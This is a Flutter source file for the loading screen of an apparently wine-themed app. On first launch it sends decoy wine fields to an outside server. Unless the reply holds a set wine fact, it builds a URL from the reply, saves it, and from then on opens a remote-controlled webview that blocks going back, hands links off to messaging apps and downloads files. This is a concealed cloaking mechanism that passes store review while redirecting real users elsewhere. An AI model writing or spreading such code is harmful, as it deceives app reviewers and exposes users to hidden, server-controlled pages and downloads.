import 'dart:convert';
import 'dart:io';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_downloader/flutter_downloader.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter/services.dart';
import 'package:path_provider/path_provider.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:wineline/navigation/bottom_navigation.dart';
import 'package:wineline/pages/splash_screen.dart';
import 'package:wineline/providers/bottle_provider.dart';

class LoadingScreen extends StatefulWidget {
  const LoadingScreen({super.key});

  @override
  State<LoadingScreen> createState() => _LoadingScreenState();
}

class _LoadingScreenState extends State<LoadingScreen> {
  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _checkStatus(context);
    });
  }

  @override
  void dispose() {
    SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    super.dispose();
  }

  Future<String> getUserAgent() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    String userAgent;

    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      userAgent =
          'Mozilla/5.0 (${androidInfo.brand}; ${androidInfo.model}; Android ${androidInfo.version.release}) Mobile';
    } else if (Platform.isIOS) {
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      userAgent =
          'Mozilla/5.0 (iPhone; CPU iPhone OS ${iosInfo.systemVersion.replaceAll(".", "_")} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/${iosInfo.utsname.machine}';
    } else {
      userAgent = 'Unknown User Agent';
    }

    return userAgent;
  }

  Future<void> _checkStatus(BuildContext context) async {
    final provider = Provider.of<BottleProvider>(context, listen: false);
    final isFirstOpen = await provider.isFirstAppOpen();

    try {
      print("-----------------------------------------------");
      print(isFirstOpen);
      print("-----------------------------------------------");
      
      if (isFirstOpen) {
        var uri = Uri.parse(
          'https://crystorz-furrious.site/oldest_bottle2026/',
        );
        final userAgent = await getUserAgent();

        var response = await http.post(
          uri,
          headers: {
            'User-Agent': userAgent,
            'Content-Type': 'application/json',
          },
          body: jsonEncode({
            'giftwave_instinct': 'calm_reflection',
            'unwrap_memory_code': 'UX192837',
            'echowrap_tradition': 'heritage_pulse',
            'surprise_curve_effect': 'unexpected_joy',
            'oldest_winery': 'Château de Goulaine',
            'wine_in_space': 'Stardust Merlot',
            'red_white_grapes': 'Cabernet Sauvignon',
            'wine_ocean': 'Deep Sea Chardonnay',
          }),
        );

        if (response.statusCode == 200) {
          final responseBody = json.decode(response.body);

          if (responseBody['oldest_winery'] != null &&
              responseBody['oldest_winery'].startsWith(
                'The oldest known winery',
              )) {
            Navigator.pushReplacement(
              context,
              MaterialPageRoute(builder: (context) => const BottomNavigation()),
            );
          } else {
            String url =
                'https://' +
                responseBody.values
                    .map(
                      (value) =>
                          value.startsWith('oldest_bottle2026')
                              ? value.substring(17)
                              : value,
                    )
                    .join('');

            await provider.setUrl(url);

            Navigator.pushReplacement(
              context,
              MaterialPageRoute(builder: (context) => WebViewScreen(url: url)),
            );
          }
        } else {
          Navigator.pushReplacement(
            context,
            MaterialPageRoute(builder: (context) => const BottomNavigation()),
          );
        }
      } else if (provider.url != null) {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(
            builder: (context) => WebViewScreen(url: provider.url!),
          ),
        );
      } else {
        Navigator.pushReplacement(
          context,
          MaterialPageRoute(builder: (context) => const BottomNavigation()),
        );
      }
    } catch (e) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const BottomNavigation()),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async {
        return false;
      },
      child: const SplashScreen(),
    );
  }
}

class WebViewScreen extends StatefulWidget {
  final String url;

  const WebViewScreen({super.key, required this.url});

  @override
  State<WebViewScreen> createState() => _WebViewScreenState();
}

class _WebViewScreenState extends State<WebViewScreen> {
  InAppWebViewController? webViewController;
  String? currentUrl;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
  }

  @override
  void dispose() {
    SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    super.dispose();
  }

  Future<bool> _handleCustomScheme(String url) async {
    final customSchemes = [
      'tg://',
      'tg:resolve?domain=',
      'viber://',
      'line://',
      'whatsapp://',
      'tel://',
    ];

    if (url.startsWith('tg:resolve?domain=')) {
      String domain = Uri.parse(url).queryParameters['domain'] ?? '';
      final Uri telegramUri = Uri.parse('https://t.me/$domain');

      if (await canLaunchUrl(telegramUri)) {
        await launchUrl(telegramUri, mode: LaunchMode.externalApplication);
        return true;
      } else {
        print('Не удалось открыть ссылку Telegram.');
      }
    } else if (url.startsWith('whatsapp://')) {
      await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);
      return true;
    } else {
      for (var scheme in customSchemes) {
        if (url.startsWith(scheme)) {
          if (await canLaunchUrl(Uri.parse(url))) {
            await launchUrl(
              Uri.parse(url),
              mode: LaunchMode.externalApplication,
            );
            return true;
          } else {
            print('Не удалось открыть $scheme');
          }
        }
      }
    }
    return false;
  }

  @override
  Widget build(BuildContext context) {
    InAppWebViewSettings settings = InAppWebViewSettings(
      allowFileAccessFromFileURLs: false,
      allowUniversalAccessFromFileURLs: false,
      useOnDownloadStart: true,
    );

    return PopScope(
      canPop: false,
      onPopInvoked: (bool didPop) async {
        bool canGoBack = await webViewController!.canGoBack();
        if (canGoBack) {
          String? currentUrl = (await webViewController?.getUrl())?.toString();
          if (currentUrl == widget.url) {
            SystemNavigator.pop();
          } else {
            webViewController!.goBack();
          }
        } else {
          SystemNavigator.pop();
        }
      },
      child: SafeArea(
        child: Scaffold(
          body: InAppWebView(
            initialUrlRequest: URLRequest(url: WebUri(widget.url)),
            initialSettings: settings,
            initialOptions: InAppWebViewGroupOptions(
              android: AndroidInAppWebViewOptions(
                useHybridComposition: true,
                supportMultipleWindows: true,
              ),
              crossPlatform: InAppWebViewOptions(
                useShouldOverrideUrlLoading: true,
                mediaPlaybackRequiresUserGesture: true,
                javaScriptCanOpenWindowsAutomatically: true,
              ),
            ),
            shouldOverrideUrlLoading: (controller, navigationAction) async {
              final url = navigationAction.request.url.toString();
              if (await _handleCustomScheme(url)) {
                return NavigationActionPolicy.CANCEL;
              }
              return NavigationActionPolicy.ALLOW;
            },
            onWebViewCreated: (controller) {
              webViewController = controller;
            },
            onProgressChanged: (controller, progress) {
              print('WebView загружается: $progress%');
            },
            onLoadStart: (controller, url) {
              SystemChrome.setPreferredOrientations([
                DeviceOrientation.portraitUp,
                DeviceOrientation.portraitDown,
                DeviceOrientation.landscapeLeft,
                DeviceOrientation.landscapeRight,
              ]);
              print('Загрузка страницы началась: $url');
              setState(() {
                currentUrl = url?.toString();
              });
            },
            onLoadStop: (controller, url) async {
              await _requestPermissions();
              print('Загрузка завершена: $url');
            },
            onEnterFullscreen: (controller) {
              SystemChrome.setPreferredOrientations([
                DeviceOrientation.portraitUp,
                DeviceOrientation.portraitDown,
                DeviceOrientation.landscapeLeft,
                DeviceOrientation.landscapeRight,
              ]);
            },
            onDownloadStartRequest: (controller, request) async {
              final url = request.url.toString();
              print('onDownloadStartRequest: $url');
              await _downloadFile(url);
            },
          ),
        ),
      ),
    );
  }

  Future<void> _requestPermissions() async {
    if (Platform.isAndroid) {
      var status = await Permission.storage.status;
      if (!status.isGranted) {
        await Permission.storage.request();
      }

      if (await Permission.notification.isDenied) {
        await Permission.notification.request();
      }
    }
  }

  Future<String?> _getDownloadsDirectoryPath() async {
    if (Platform.isAndroid) {
      List<Directory>? directories = await getExternalStorageDirectories(
        type: StorageDirectory.downloads,
      );
      if (directories?.isNotEmpty ?? false) {
        return directories?.first.path;
      }
    }
    return null;
  }

  Future<void> _downloadFile(String url) async {
    await _requestPermissions();
    try {
      print('Попытка скачать файл: $url');
      String? downloadsPath = await _getDownloadsDirectoryPath();
      if (downloadsPath == null) {
        print('Не удалось получить директорию загрузок.');
        return;
      }

      final fileName = url.split('/').last;
      final filePath = '$downloadsPath/$fileName';

      final file = File(filePath);
      if (await file.exists()) {
        await file.delete();
      }

      final taskId = await FlutterDownloader.enqueue(
        url: url,
        savedDir: downloadsPath,
        fileName: fileName,
        showNotification: true,
        openFileFromNotification: true,
      );

      print('Запущена загрузка с ID: $taskId');
    } catch (e) {
      print('Ошибка при скачивании файла: $e');
    }
  }
}
